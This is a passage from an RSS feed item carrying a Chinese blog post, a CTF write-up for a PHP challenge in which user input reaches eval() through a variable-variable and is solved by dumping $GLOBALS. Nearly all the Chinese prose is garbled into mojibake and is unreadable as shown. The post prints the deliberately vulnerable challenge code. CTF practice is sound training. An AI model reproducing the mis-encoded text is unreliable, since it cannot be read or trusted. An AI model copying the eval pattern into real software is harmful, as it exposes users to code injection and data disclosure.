æ€»ç»“çš„è¯å°±æ˜¯ï¼šwebé¢˜è§£å†³çš„å…³é”®çš„ç†Ÿæ‚‰phpä»¥åŠç†è§£phpçš„è„†å¼±æ–¹é¢ï¼›2 phpæ˜¯ç›´æ¥ä¸Šæœ€å¥½çš„è¯­è¨€ï¼ˆç‹—å¤´ï¼‰</description>
			<content type="html"><![CDATA[<p><img src="/img/bomb/t.JPG" alt="çˆ†ç ´1-3">
å®è·µè¯æ˜ï¼Œæç¤ºä¹Ÿæœ‰ä¸å¯é çš„æ—¶å€™ï¼Œå‡ºé¢˜äººä¹Ÿä¼šé¸¡è´¼ã€‚
<a href="https://www.ichunqiu.com/battalion">çˆ†ç ´ä¸€é¢˜ç›®åœ°å€</a>
è¿™é“é¢˜æœ‰æ—¶é—´é™åˆ¶ï¼Œå¿…é¡»åœ¨ä¸€å°æ—¶å†…å®Œæˆï¼Œå¦åˆ™é¡µé¢ä¼šå¤±æ•ˆï¼Œè¯´ç™½äº†æ˜¯ä¸ºäº†æœç»ç­¾åˆ°é¢˜äº’ç›¸æŠ„è¢­hhhã€‚
è¿›å»åç»™çš„æ˜¯phpåç«¯æºç ã€‚</p>
<p>è¿™æ˜¯æœ¬èœé¸¡ç¬¬ä¸€æ¬¡æ¥è§¦<!-- raw HTML omitted -->æ‹é»„ç‰‡<!-- raw HTML omitted --> php, ä¼šäº†å‡ æ‹›åå‘ç°phpçš„è¯­æ³•ç®€ç›´åƒæ˜¯C+pythonçš„ç§ç”Ÿå­ï¼Œå¸¦åŸºå› ç¼ºé™·çš„é‚£ç§ã€‚å®ƒå¾ˆå¤šå‡½æ•°æ–¹æ³•éƒ½èƒ½è½»æ˜“åœ°è·å¾—æ–‡ä»¶åœ°æ‰€æœ‰ä¿¡æ¯ï¼Œè¿˜æœ‰å¤§å †åœ°å…¨å±€å˜é‡é­”æœ¯å˜é‡ï¼Œé…ä¸Ševal()æ–¹æ³•åœ°ç¼ºé™·ï¼Œç®€ç›´æ˜¯çˆ†ç ´å¯¹è±¡çš„ä¸Šä¸Šä¹‹é€‰å•Šã€‚ã€‚
åºŸè¯ä¸å¤šè¯´ï¼Œæ¥çœ‹çœ‹ä»£ç ï¼š</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">include</span> <span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;hello&#39;</span><span class="p">];</span>
<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\w*$/&#39;</span><span class="p">,</span><span class="nv">$a</span> <span class="p">)){</span>
  <span class="k">die</span><span class="p">(</span><span class="s1">&#39;ERROR&#39;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">eval</span><span class="p">(</span><span class="s2">&#34;var_dump($</span><span class="si">$a</span><span class="s2">);&#34;</span><span class="p">);</span>
<span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>@$_REQUEST[&lsquo;hello&rsquo;] æç¤ºæˆ‘ä»¬ä¸Šä¼ çš„å˜é‡åä¸ºhello</p>
<p>requestæ˜¯ä¸¤ç§æ•°æ®ä¸Šä¼ æ–¹å¼postå’Œgetçš„ç»Ÿç§°
è¿™é‡Œå½“ç„¶é€‰æ›´æ–¹ä¾¿çš„get, ç›´æ¥åœ¨urlååŠ helloå˜é‡
ä¸‹é¢çš„åˆ¤æ–­è¯­å¥ä¸­çš„æ­£åˆ™æç¤ºæˆ‘ä»¬å˜é‡å¿…é¡»ä¸º[A-Za-z0-9_]
ä»¥åŠ$$aå‘Šè¯‰å’±$açš„å€¼ä¸èƒ½ä¹±è¾“ï¼Œå€¼è¦ç¬¦åˆå˜é‡å‘½åè§„åˆ™ï¼šå¼€å¤´å­—æ¯ä¸‹åˆ’çº¿ï¼Œä¹‹ååªèƒ½å­—æ¯ä¸‹åˆ’çº¿æˆ–æ•°å­—ã€‚
ç»§ç»­å¾€ä¸‹çœ‹, å°±å‘ç°ç¥åœ£çš„é€‰æ‹©å¼€å§‹äº†ï¼š</p>
<p>1ï¼šåˆ©ç”¨var_dump()è¾“å‡ºå˜é‡å†…å®¹ï¼Œå‰ææ˜¯å¾—çŸ¥é“æœ‰ä¸ªå˜é‡åæ˜¯è¾“å…¥çš„å€¼ã€‚å…¶å®ä¸å¯èƒ½ç»™ä½ çŒœçš„ï¼Œè¿™ç§æƒ…å†µä¸‹åªèƒ½å…¨å±€å˜é‡æˆ–é­”æœ¯å˜é‡ã€‚ä¿é™©èµ·è§ï¼Œé€‰ä¸ªè¶…é›†ï¼š$GLOABALS</p>
<p>2: ç±»ä¼¼sqlæ³¨å…¥ï¼Œç»•å¼€var_dump()ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œè¿™è¦æ±‚å’±è¾“å…¥çš„å‘½ä»¤åŒ…æ‹¬â€œflag.phpâ€ï¼Œä½†æ˜¯æ­£åˆ™ä¸å…è®¸å–ï¼Œè¯¥æ€è·¯å¤±è´¥ã€‚
æœ€åæŒ‰ç…§1æ€è·¯ï¼Œç›´æ¥æŠŠinclude&quot;flag.php&quot;åçš„å…¨å±€å˜é‡å…¨æ‰“å°å‡ºæ¥äº†ã€‚
å‘ç°flagåœ¨ä¸€ä¸ªå…­ä½çš„å…¨å±€å˜é‡é‡Œã€‚</p>
<p>åšåˆ°è¿™é‡Œå†çœ‹æç¤ºï¼Œè¯´çœŸçš„ï¼Œåº”è¯¥åªæœ‰é«˜æ‰‹å’Œåšå®Œçš„äººèƒ½æ¨å‡ºå…¶ä¸­æ„æ€ï¼Œæˆ‘è¿™æ ·çš„èœé¸¡å¾ˆæœ‰å¯èƒ½å»çŒœæ–‡ä»¶é‡Œçš„å…­ä½å˜é‡å€¼ã€‚</p>
<p>åé¢é™†ç»­æŠŠçˆ†ç ´äºŒï¼Œçˆ†ç ´ä¸‰åšæ‰äº†ï¼ˆå·å·å‚è€ƒäº†ä¸‹WP å˜¿å˜¿ï¼‰</p>
<p>æ€»ç»“çš„è¯å°±æ˜¯ï¼šwebé¢˜è§£å†³çš„å…³é”®çš„ç†Ÿæ‚‰phpä»¥åŠç†è§£phpçš„è„†å¼±æ–¹é¢ï¼›2 phpæ˜¯ç›´æ¥ä¸Šæœ€å¥½çš„è¯­è¨€ï¼ˆç‹—å¤´ï¼‰</p>
]]></content>
		</item>
		
	</channel>
</rss>
